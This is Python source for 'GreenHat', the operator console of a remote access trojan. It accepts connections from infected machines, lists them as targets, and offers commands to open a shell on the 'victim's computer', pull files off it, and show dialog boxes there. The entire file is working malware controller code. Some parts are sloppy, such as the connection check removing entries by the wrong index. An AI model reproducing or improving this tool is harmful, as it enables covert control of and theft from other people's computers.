import socket
import time
import threading
import sys
import os

class app:
    all_conns = []
    all_addr = []

    #commands
    allgreenhatcmd = {"help":"Shows all the currently supported commands.", "connect":"connect to a computer", "port":"Displayes the current port which is being used by GreenHat.", "target":"Shows all the computers available to be connected!", "exit": "Exits the Program"}
    conn_cmds = {"download":"Downloads a file.", "status":"Displayes the current strenght and info of the connection.", 'disconnect':"Disconnects from a computer.", "exit":"Disconnects from a computer.", 'show_dialog':'Shows a dialog box on the victims computer.', 'shell':'Opens a shell for victims computer.'} #exit and disconnect have similar functionality

    conn_est = False
    curr_comp = ""
    
    s_cmd = "greenhat> "
    
    def __init__(self):

        #welcome
        
        print("Type help for displaying commands...")
        print("\n")
        
        #creating the socket
        self.sock_create()
    
        #thread for accepting connections
        self.acc_thread = threading.Thread(target=self.sock_accept)
        self.acc_thread.daemon = True
        self.acc_thread.start()

        '''

        self.simple_thread = threading.Thread(target=self.printt)
        self.simple_thread.daemon = True
        self.simple_thread.start()

        '''

        #thread for checking connections
        self.check_conn_thread = threading.Thread(target=self.check_conn)
        self.check_conn_thread.daemon = True
        self.check_conn_thread.start()

        while True:
            
            print(self.s_cmd, end='')
            getcmd = input("")
            
            if(getcmd=='help'):
                print('All the current supported commands - \n')
                for i, cmds in enumerate(self.allgreenhatcmd):
                    print(str(i)+".", str(cmds), "-", self.allgreenhatcmd[cmds])

            elif(getcmd[:7]=='connect'):
                com_name = getcmd[8:]
                self.connect_comp(com_name)

            elif(getcmd=='port'):
                print("789")

            elif(getcmd=='target'):
                print("Available computers - \n")
                for i, dicta in enumerate(self.all_addr):
                    print(str(i)+".", str(dicta["name"]))

            elif(getcmd=='exit'):
                sys.exit()

            else:
                print("Not a command")

            print("\n")


    def connect_comp(self, com_name):

        c_addr = 0

        c_addr_got = False
        for i, dixt in enumerate(self.all_addr):
            if(dixt["name"]==com_name):
                c_addr = self.all_conns[i]
                c_addr_got = True
                break

        if(c_addr_got==False):
            print("No computers with this name.")
            return False

        self.conn_est = True
        self.s_cmd = "greenhat/"+com_name+"> "

        while True:
            print(self.s_cmd, end='')
            getcmd = input("")

            if(getcmd=='shell'):
                c_addr.send('shell'.encode())
                getcwd = c_addr.recv(2048).decode()
                self.s_cmd = getcwd+"> "
                while True:
                    print(self.s_cmd, end='')
                    getcmd_shell = input("")
                    if(getcmd_shell[0:4]=='exit'):
                        c_addr.send("exit".encode())
                        self.s_cmd = "greenhat/"+com_name+"> "
                        break
                    elif(getcmd_shell[:2]=='cd'):
                        c_addr.send(getcmd_shell.encode())
                        out = c_addr.recv(2048).decode()
                        if(out=='error'):
                            print("This Directory does'nt exists.")
                        else:
                            self.s_cmd = out+"> "
                    elif(getcmd_shell[1:2]==':'):
                        c_addr.send(getcmd_shell.encode())
                        out = c_addr.recv(2048).decode()
                        if(out=='error'):
                            print("This Directory does'nt exists.")
                        else:
                            self.s_cmd = out+"> "
                    else:    
                        c_addr.send(getcmd_shell.encode())
                        output = c_addr.recv(90000).decode()
                        print(output)

            elif(getcmd[0:8]=='download'):
                c_addr.send('download'.encode())
                path = getcmd[9:]
                filename = os.path.basename(path)
                c_addr.send(path.encode())

                getd = c_addr.recv(2048).decode()

                if(getd=='error'):
                    print("The file doesn't exits.")
                else:
                    getdata = c_addr.recv(99999)
                    totalRecv = len(getdata)
                    with open("F:\\algorithms practice\\GreenHat\\"+filename, "wb") as f:
                        f.write(getdata)
                
            elif(getcmd=='status'):
                print("You are currently connected to "+com_name+"'s computer")

            elif(getcmd=='disconnect' or getcmd=='exit'):
                self.s_cmd = "greenhat> "
                break

            elif(getcmd=='show_dialog'):
                c_addr.send("show_dialog".encode())
                title = input("Title for the dialog: ")
                c_addr.send(title.encode())
                box_content = input("Content for the dialog: ")
                c_addr.send(box_content.encode())

            elif(getcmd=='help'):
                print('All the current supported commands - \n')
                for i, cmds in enumerate(self.conn_cmds):
                    print(str(i)+".", str(cmds), "-", self.conn_cmds[cmds])

                print("\n")

            else:
                print("Wrong Command")
        

    def check_conn(self):
        while self.conn_est==False:
            for conn in self.all_conns:
                try:
                    conn.send("check".encode())
                except:
                    geti = 0
                    for i, connn in enumerate(self.all_conns):
                        if(connn==conn):
                            geti = i

                    self.all_conns.remove(conn)
                    self.all_addr.remove(self.all_addr[i])

            time.sleep(1)

    def printt(self):
        while True:
            print(self.all_conns)
            print(self.all_addr)
            time.sleep(2)

    def sock_accept(self):
        while True:
            c, (ip, port) = self.sock.accept()
            comp_name = c.recv(2048).decode()
            self.all_conns.append(c)
            self.all_addr.append({"ip": ip, "port": port, "name": str(comp_name)})

    def sock_create(self):
        self.sock = socket.socket()
        self.sock.bind(("localhost", 789))

        self.sock.listen(1)

app = app()

